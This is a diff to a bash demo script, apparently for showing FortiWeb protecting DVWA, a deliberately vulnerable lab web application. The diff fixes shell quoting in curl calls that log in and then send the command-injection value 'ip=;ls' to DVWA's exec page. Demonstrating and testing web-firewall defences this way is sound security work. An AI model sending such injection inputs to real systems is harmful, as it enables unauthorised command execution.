@@ -339,28 +339,28 @@ Command_Injection() {
     echo ""
     echo -e "Connecting to ${CYAN_BOLD}${DVWA_URL}/login.php${RESTORE} username=${WHITE_BOLD}pablo${RESTORE} password=${WHITE_BOLD}letmein${RESTORE}"
     echo ""
-    curl '$DVWA_URL/login.php' \
-        -H 'authority: dvwa.corp.fabriclab.ca' \
-        -H 'cache-control: max-age=0' \
-        -H 'content-type: application/x-www-form-urlencoded' \
-        -H 'origin: ${DVWA_URL}' \
-        -H 'referer: ${DVWA_URL}/' \
-        -H 'user-agent: FortiWeb Demo Script' \
+    curl "${DVWA_URL}/login.php" \
+        -H "authority: ${DVWA_URL}" \
+        -H "cache-control: max-age=0" \
+        -H "content-type: application/x-www-form-urlencoded" \
+        -H "origin: ${DVWA_URL}" \
+        -H "referer: ${DVWA_URL}/" \
+        -H "user-agent: FortiWeb Demo Script" \
         --insecure \
-        --data-raw 'username=pablo&password=letmein&Login=Login' \
+        --data-raw "username=pablo&password=letmein&Login=Login" \
         -c cookie.txt
 
     echo -e "Connecting to ${CYAN_BOLD}${DVWA_URL}/vulnerabilities/exec/${RESTORE} submit=${RED_BOLD}\";ls\""
     echo ""
-    curl -s '$DVWA_URL/vulnerabilities/exec/' \
-        -H 'authority: dvwa.corp.fabriclab.ca' \
-        -H 'cache-control: max-age=0' \
-        -H 'content-type: application/x-www-form-urlencoded' \
-        -H 'origin: ${DVWA_URL}' \
-        -H 'referer: ${DVWA_URL}/index.php' \
-        -H 'user-agent: FortiWeb Demo Script' \
+    curl -s "${DVWA_URL}/vulnerabilities/exec/" \
+        -H "authority: dvwa.corp.fabriclab.ca" \
+        -H "cache-control: max-age=0" \
+        -H "content-type: application/x-www-form-urlencoded" \
+        -H "origin: ${DVWA_URL}" \
+        -H "referer: ${DVWA_URL}/index.php" \
+        -H "user-agent: FortiWeb Demo Script" \
         --insecure \
-        --data-raw 'ip=;ls&Submit=Submit' \
+        --data-raw "ip=;ls&Submit=Submit" \
         -b cookie.txt | grep -oP '(?<=<h3>).*?(?=</h3>)'
 
     echo ""
